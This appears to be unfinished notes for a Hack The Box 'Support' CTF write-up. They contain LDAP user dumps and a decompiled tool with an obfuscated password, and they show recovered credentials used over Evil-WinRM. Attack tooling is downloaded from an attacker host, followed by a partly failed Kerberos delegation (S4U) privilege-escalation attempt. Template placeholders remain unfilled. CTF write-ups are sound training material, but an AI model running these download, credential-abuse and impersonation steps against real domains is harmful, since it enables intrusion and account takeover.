# langley.lucy, Users, support.htb
dn: CN=langley.lucy,CN=Users,DC=support,DC=htb
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: langley.lucy
sn: langley
c: US
l: Chapel Hill
st: NC
postalCode: 27514
givenName: lucy
distinguishedName: CN=langley.lucy,CN=Users,DC=support,DC=htb
instanceType: 4
whenCreated: 20220528111510.0Z
whenChanged: 20220528111511.0Z
uSNCreated: 12996
uSNChanged: 13011
company: support
streetAddress: Skipper Bowles Dr
name: langley.lucy
objectGUID:: T9fnf6QIlE2uz+4YhFZ3aw==
userAccountControl: 66048
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 0
lastLogoff: 0
lastLogon: 0
pwdLastSet: 132982101109308007
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAG9v9Y4G6g8nmcEILXQQAAA==
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: langley.lucy
sAMAccountType: 805306368
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=support,DC=htb
dSCorePropagationData: 20220528111511.0Z
dSCorePropagationData: 16010101000000.0Z
mail: langley.lucy@support.htb

# daughtler.mabel, Users, support.htb
dn: CN=daughtler.mabel,CN=Users,DC=support,DC=htb
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: daughtler.mabel
sn: daughtler
c: US
l: Chapel Hill
st: NC
postalCode: 27514
givenName: mabel
distinguishedName: CN=daughtler.mabel,CN=Users,DC=support,DC=htb
instanceType: 4
whenCreated: 20220528111526.0Z
whenChanged: 20220528111527.0Z
uSNCreated: 13013
uSNChanged: 13028
company: support
streetAddress: Skipper Bowles Dr
name: daughtler.mabel
objectGUID:: iWH2yMa7h0e1dPAKT9MtgA==
userAccountControl: 66048
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 0
lastLogoff: 0
lastLogon: 0
pwdLastSet: 132982101262745576
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAG9v9Y4G6g8nmcEILXgQAAA==
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: daughtler.mabel
sAMAccountType: 805306368
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=support,DC=htb
dSCorePropagationData: 20220528111526.0Z
dSCorePropagationData: 16010101000000.0Z
mail: daughtler.mabel@support.htb

# stoll.rachelle, Users, support.htb
dn: CN=stoll.rachelle,CN=Users,DC=support,DC=htb
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: stoll.rachelle
sn: stoll
c: US
l: Chapel Hill
st: NC
postalCode: 27514
givenName: rachelle
distinguishedName: CN=stoll.rachelle,CN=Users,DC=support,DC=htb
instanceType: 4
whenCreated: 20220528111542.0Z
whenChanged: 20220528111543.0Z
uSNCreated: 13030
uSNChanged: 13045
company: support
streetAddress: Skipper Bowles Dr
name: stoll.rachelle
objectGUID:: Oe9hWbyotkWg+Aty/bcKYw==
userAccountControl: 66048
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 0
lastLogoff: 0
lastLogon: 0
pwdLastSet: 132982101422902140
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAG9v9Y4G6g8nmcEILXwQAAA==
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: stoll.rachelle
sAMAccountType: 805306368
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=support,DC=htb
dSCorePropagationData: 20220528111542.0Z
dSCorePropagationData: 16010101000000.0Z
mail: stoll.rachelle@support.htb

# ford.victoria, Users, support.htb
dn: CN=ford.victoria,CN=Users,DC=support,DC=htb
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: ford.victoria
sn: ford
c: US
l: Chapel Hill
st: NC
postalCode: 27514
givenName: victoria
distinguishedName: CN=ford.victoria,CN=Users,DC=support,DC=htb
instanceType: 4
whenCreated: 20220528111557.0Z
whenChanged: 20220528111558.0Z
uSNCreated: 13048
uSNChanged: 13063
company: support
streetAddress: Skipper Bowles Dr
name: ford.victoria
objectGUID:: igFAMPhgAEqMFr/4HUIY5A==
userAccountControl: 66048
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 0
lastLogoff: 0
lastLogon: 0
pwdLastSet: 132982101581183009
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAG9v9Y4G6g8nmcEILYAQAAA==
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: ford.victoria
sAMAccountType: 805306368
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=support,DC=htb
dSCorePropagationData: 20220528111558.0Z
dSCorePropagationData: 16010101000000.0Z
mail: ford.victoria@support.htb

# search reference
ref: ldap://ForestDnsZones.support.htb/DC=ForestDnsZones,DC=support,DC=htb

# search reference
ref: ldap://DomainDnsZones.support.htb/DC=DomainDnsZones,DC=support,DC=htb

# search reference
ref: ldap://support.htb/CN=Configuration,DC=support,DC=htb

# search result
search: 2
result: 0 Success

# numResponses: 24
# numEntries: 20
# numReferences: 3


```

Credentials recovered: `support:Ironside47pleasure40Watchful`

## User Flag

```
evil-winrm -i 10.129.50.211 -u support -p Ironside47pleasure40Watchful
```

```
*Evil-WinRM* PS C:\Users\support\Desktop> cat user.txt
89a6b2b28e02a4a1ef1c54d42f73a1b7
```

---
## Privilege Escalation

### Enumeration

```
*Evil-WinRM* PS C:\Users\support\Documents> whoami /all

USER INFORMATION
----------------

User Name       SID
=============== =============================================
support\support S-1-5-21-1677581083-3380853377-188903654-1105


GROUP INFORMATION
-----------------

Group Name                                 Type             SID                                           Attributes
========================================== ================ ============================================= ==================================================
Everyone                                   Well-known group S-1-1-0                                       Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users            Alias            S-1-5-32-580                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                                  Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                       Well-known group S-1-5-2                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15                                      Mandatory group, Enabled by default, Enabled group
SUPPORT\Shared Support Accounts            Group            S-1-5-21-1677581083-3380853377-188903654-1103 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10                                   Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.

```

Bloodhound pic:

```
 (New-Object Net.WebClient).DownloadFile('http://10.10.14.254:8000/Powermad.ps1','C:\Users\support\Documents\Powermad.ps1')
```

```
*Evil-WinRM* PS C:\Users\support\Documents> import-module .\powermad.ps1
```

```
*Evil-WinRM* PS C:\Users\support\Documents> New-MachineAccount -MachineAccount attackersystem -Password $(ConvertTo-SecureString 'Summer2018!' -AsPlainText -Force)
[+] Machine account attackersystem added
```

```
*Evil-WinRM* PS C:\Users\support\Documents> (New-Object Net.WebClient).DownloadFile('http://10.10.14.254:8000/PowerView.ps1','C:\Users\support\Documents\PowerView.ps1')
```

```
*Evil-WinRM* PS C:\Users\support\Documents> import-module .\powerview.ps1
```

```
*Evil-WinRM* PS C:\Users\support\Documents> Get-DomainComputer -Identity attackersystem


pwdlastset             : 7/13/2026 11:44:19 AM
logoncount             : 0
badpasswordtime        : 12/31/1600 4:00:00 PM
distinguishedname      : CN=attackersystem,CN=Computers,DC=support,DC=htb
objectclass            : {top, person, organizationalPerson, user...}
name                   : attackersystem
objectsid              : S-1-5-21-1677581083-3380853377-188903654-6102
samaccountname         : attackersystem$
localpolicyflags       : 0
codepage               : 0
samaccounttype         : MACHINE_ACCOUNT
accountexpires         : NEVER
countrycode            : 0
whenchanged            : 7/13/2026 6:44:19 PM
instancetype           : 4
usncreated             : 90262
objectguid             : 6c82eb5a-1209-4a45-b953-3188f5509020
lastlogon              : 12/31/1600 4:00:00 PM
lastlogoff             : 12/31/1600 4:00:00 PM
objectcategory         : CN=Computer,CN=Schema,CN=Configuration,DC=support,DC=htb
dscorepropagationdata  : 1/1/1601 12:00:00 AM
serviceprincipalname   : {RestrictedKrbHost/attackersystem, HOST/attackersystem, RestrictedKrbHost/attackersystem.support.htb, HOST/attackersystem.support.htb}
ms-ds-creatorsid       : {1, 5, 0, 0...}
badpwdcount            : 0
cn                     : attackersystem
useraccountcontrol     : WORKSTATION_TRUST_ACCOUNT
whencreated            : 7/13/2026 6:44:19 PM
primarygroupid         : 515
iscriticalsystemobject : False
usnchanged             : 90264
dnshostname            : attackersystem.support.htb



*Evil-WinRM* PS C:\Users\support\Documents> Get-ADComputer attackersystem -Properties objectSid


DistinguishedName : CN=attackersystem,CN=Computers,DC=support,DC=htb
DNSHostName       : attackersystem.support.htb
Enabled           : True
Name              : attackersystem
ObjectClass       : computer
ObjectGUID        : 6c82eb5a-1209-4a45-b953-3188f5509020
objectSid         : S-1-5-21-1677581083-3380853377-188903654-6102
SamAccountName    : attackersystem$
SID               : S-1-5-21-1677581083-3380853377-188903654-6102
UserPrincipalName :

```

importing rubeus

```
*Evil-WinRM* PS C:\Users\support\Documents> (New-Object Net.WebClient).DownloadFile('http://10.10.14.254:8001/Rubeus.exe','C:\Users\support\Documents\Rubeus.exe')
```

```
*Evil-WinRM* PS C:\Users\support\Documents> .\Rubeus.exe hash /password:Summer2018!

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v1.6.4


[*] Action: Calculate Password Hash(es)

[*] Input password             : Summer2018!
[*]       rc4_hmac             : EF266C6B963C0BB683941032008AD47F

[!] /user:X and /domain:Y need to be supplied to calculate AES and DES hash types!

```

```
*Evil-WinRM* PS C:\Users\support\Documents> .\Rubeus.exe s4u /user:attackersystem$ /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:admin /msdsspn:cifs/TARGETCOMPUTER.testlab.local /ptt

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v1.6.4

[*] Action: S4U

[*] Using rc4_hmac hash: EF266C6B963C0BB683941032008AD47F
[*] Building AS-REQ (w/ preauth) for: 'support.htb\attackersystem$'
[+] TGT request successful!
[*] base64(ticket.kirbi):

      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
      cnQuaHRi


[*] Action: S4U

[*] Using domain controller: dc.support.htb (::1)
[*] Building S4U2self request for: 'attackersystem$@SUPPORT.HTB'
[*] Sending S4U2self request

[X] KRB-ERROR (6) : KDC_ERR_C_PRINCIPAL_UNKNOWN

[*] Impersonating user 'admin' to target SPN 'cifs/TARGETCOMPUTER.testlab.local'
[*] Using domain controller: dc.support.htb (::1)
[*] Building S4U2proxy request for service: 'cifs/TARGETCOMPUTER.testlab.local'

[!] Unhandled Rubeus exception:

System.NullReferenceException: Object reference not set to an instance of an object.
   at Rubeus.S4U.S4U2Proxy(KRB_CRED kirbi, String targetUser, String targetSPN, String outfile, Boolean ptt, String domainController, String altService, KRB_CRED tgs, Boolean opsec)
   at Rubeus.S4U.Execute(KRB_CRED kirbi, String targetUser, String targetSPN, String outfile, Boolean ptt, String domainController, String altService, KRB_CRED tgs, String targetDomainController, String targetDomain, Boolean s, Boolean opsec, Boolean bronzebit, String keyString, KERB_ETYPE encType, String requestDomain, String impersonateDomain)
   at Rubeus.S4U.Execute(String userName, String domain, String keyString, KERB_ETYPE etype, String targetUser, String targetSPN, String outfile, Boolean ptt, String domainController, String altService, KRB_CRED tgs, String targetDomainController, String targetDomain, Boolean self, Boolean opsec, Boolean bronzebit)
   at Rubeus.Commands.S4u.Execute(Dictionary`2 arguments)
   at Rubeus.Domain.CommandCollection.ExecuteCommand(String commandName, Dictionary`2 arguments)
   at Rubeus.Program.MainExecute(String commandName, Dictionary`2 parsedArgs)

```
### Exploitation

Step-by-step privilege escalation.

```shell
# Commands used
```

---
## Remediation

- Key takeaway 1
- Key takeaway 2
- Key takeaway 3

---
## References

- [Reference 1](https://github.com/momenbasel/htb-writeups/blob/main/templates/url)
- [Reference 2](https://github.com/momenbasel/htb-writeups/blob/main/templates/url)


```

```

```
 
```



Users 

```
dapsearch -H ldap://support.htb -D "ldap@support.htb" -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b "dc=support,dc=htb" "(objectClass=user)" sAMAccountName | grep "sAMAccountName:"
```

User support: 
```
ldapsearch -H ldap://support.htb -D "ldap@support.htb" -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b "dc=support,dc=htb" "(sAMAccountName=support)"
```

```
ilspycmd UserInfo.exe
using System;
using System.Collections;
using System.Diagnostics;
using System.DirectoryServices;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Runtime.Versioning;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using MatthiWare.CommandLine;
using MatthiWare.CommandLine.Abstractions.Command;
using MatthiWare.CommandLine.Core.Attributes;
using UserInfo.Services;

[assembly: CompilationRelaxations(8)]
[assembly: RuntimeCompatibility(WrapNonExceptionThrows = true)]
[assembly: Debuggable(DebuggableAttribute.DebuggingModes.IgnoreSymbolStoreSequencePoints)]
[assembly: AssemblyTitle("UserInfo")]
[assembly: AssemblyDescription("")]
[assembly: AssemblyConfiguration("")]
[assembly: AssemblyCompany("")]
[assembly: AssemblyProduct("UserInfo")]
[assembly: AssemblyCopyright("Copyright ©  2022")]
[assembly: AssemblyTrademark("")]
[assembly: ComVisible(false)]
[assembly: Guid("5a280d0b-9fd0-4701-8f96-82e2f1ea9dfb")]
[assembly: AssemblyFileVersion("1.0.0.0")]
[assembly: TargetFramework(".NETFramework,Version=v4.8", FrameworkDisplayName = ".NET Framework 4.8")]
[assembly: AssemblyVersion("1.0.0.0")]
namespace UserInfo
{
        internal class Program
        {
                private static async Task Main(string[] args)
                {
                        CommandLineParser<GlobalOptions> commandLineParser = new CommandLineParser<GlobalOptions>(new CommandLineParserOptions
                        {
                                AppName = "UserInfo.exe"
                        });
                        commandLineParser.DiscoverCommands(Assembly.GetExecutingAssembly());
                        _ = (await commandLineParser.ParseAsync(args)).HasErrors;
                }
        }
        public class GetUserOptions
        {
                [Name("username")]
                [Required(true)]
                [Description("Username")]
                public string UserName { get; set; }
        }
        public class FindUserOptions
        {
                [Name("first")]
                [Description("First name")]
                public string FirstName { get; set; }

                [Name("last")]
                [Description("Last name")]
                public string LastName { get; set; }
        }
        public class GlobalOptions
        {
                [Name("v", "verbose")]
                [DefaultValue(false)]
                [Description("Verbose output")]
                public bool Verbose { get; set; }
        }
}
namespace UserInfo.Services
{
        internal class Protected
        {
                private static string enc_password = "0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E";

                private static byte[] key = Encoding.ASCII.GetBytes("armando");

                public static string getPassword()
                {
                        byte[] array = Convert.FromBase64String(enc_password);
                        byte[] array2 = array;
                        for (int i = 0; i < array.Length; i++)
                        {
                                array2[i] = (byte)((uint)(array[i] ^ key[i % key.Length]) ^ 0xDFu);
                        }
                        return Encoding.Default.GetString(array2);
                }
        }
        internal class LdapQuery
        {
                private DirectoryEntry entry;

                private DirectorySearcher ds;

                public LdapQuery()
                {
                        //IL_0018: Unknown result type (might be due to invalid IL or missing references)
                        //IL_0022: Expected O, but got Unknown
                        //IL_0035: Unknown result type (might be due to invalid IL or missing references)
                        //IL_003f: Expected O, but got Unknown
                        string password = Protected.getPassword();
                        entry = new DirectoryEntry("LDAP://support.htb", "support\\ldap", password);
                        entry.set_AuthenticationType((AuthenticationTypes)1);
                        ds = new DirectorySearcher(entry);
                }

                public void query(string first, string last, bool verbose = false)
                {
                        //IL_011e: Unknown result type (might be due to invalid IL or missing references)
                        try
                        {
                                if (first == null && last == null)
                                {
                                        Console.WriteLine("[-] At least one of -first or -last is required.");
                                        return;
                                }
                                string text = ((last == null) ? ("(givenName=" + first + ")") : ((first != null) ? ("(&(givenName=" + first + ")(sn=" + last + "))") : ("(sn=" + last + ")")));
                                if (verbose)
                                {
                                        Console.WriteLine("[*] LDAP query to use: " + text);
                                }
                                ds.set_Filter(text);
                                ds.get_PropertiesToLoad().Add("sAMAccountName");
                                SearchResultCollection val = ds.FindAll();
                                if (val.get_Count() == 0)
                                {
                                        Console.WriteLine("[-] No users identified with that query.");
                                        return;
                                }
                                if (verbose)
                                {
                                        string text2 = "[+] Found " + val.get_Count() + " result";
                                        if (val.get_Count() > 1)
                                        {
                                                text2 += "s";
                                        }
                                        text2 += ":";
                                        Console.WriteLine(text2);
                                }
                                foreach (SearchResult item in val)
                                {
                                        if (verbose)
                                        {
                                                Console.Write("       ");
                                        }
                                        Console.WriteLine(item.get_Properties().get_Item("sAMAccountName").get_Item(0));
                                }
                        }
                        catch (Exception ex)
                        {
                                Console.WriteLine("[-] Exception: " + ex.Message);
                        }
                }

                public void printUser(string username, bool verbose = false)
                {
                        try
                        {
                                if (verbose)
                                {
                                        Console.WriteLine("[*] Getting data for " + username);
                                }
                                ds.set_Filter("sAMAccountName=" + username);
                                ds.get_PropertiesToLoad().Add("pwdLastSet");
                                ds.get_PropertiesToLoad().Add("lastLogon");
                                ds.get_PropertiesToLoad().Add("givenName");
                                ds.get_PropertiesToLoad().Add("sn");
                                ds.get_PropertiesToLoad().Add("mail");
                                SearchResult val = ds.FindOne();
                                if (val == null)
                                {
                                        Console.WriteLine("[-] Unable to locate " + username + ". Please try the find command to get the user's username.");
                                        return;
                                }
                                if (((ReadOnlyCollectionBase)(object)val.get_Properties().get_Item("givenName")).Count > 0)
                                {
                                        Console.WriteLine("First Name:           " + val.get_Properties().get_Item("givenName").get_Item(0));
                                }
                                if (((ReadOnlyCollectionBase)(object)val.get_Properties().get_Item("sn")).Count > 0)
                                {
                                        Console.WriteLine("Last Name:            " + val.get_Properties().get_Item("sn").get_Item(0));
                                }
                                if (((ReadOnlyCollectionBase)(object)val.get_Properties().get_Item("mail")).Count > 0)
                                {
                                        Console.WriteLine("Contact:              " + val.get_Properties().get_Item("mail").get_Item(0));
                                }
                                if (val.get_Properties().Contains("pwdLastSet"))
                                {
                                        Console.WriteLine("Last Password Change: " + DateTime.FromFileTime((long)val.get_Properties().get_Item("pwdLastSet").get_Item(0)));
                                }
                        }
                        catch (Exception ex)
                        {
                                Console.WriteLine("[-] Exception: " + ex.Message);
                        }
                }
        }
}
namespace UserInfo.Commands
{
        public class FindUser : Command<GlobalOptions, FindUserOptions>
        {
                public override void OnConfigure(ICommandConfigurationBuilder builder)
                {
                        builder.Name("find").Description("Find a user");
                }

                public override async Task OnExecuteAsync(GlobalOptions options, FindUserOptions commandOptions, CancellationToken cancellationToken)
                {
                        new LdapQuery().query(commandOptions.FirstName, commandOptions.LastName, options.Verbose);
                }
        }
        public class GetUser : Command<GlobalOptions, GetUserOptions>
        {
                public override void OnConfigure(ICommandConfigurationBuilder builder)
                {
                        builder.Name("user").Description("Get information about a user");
                }

                public override async Task OnExecuteAsync(GlobalOptions options, GetUserOptions commandOptions, CancellationToken cancellationToken)
                {
                        new LdapQuery().printUser(commandOptions.UserName, options.Verbose);
                }
        }
}

```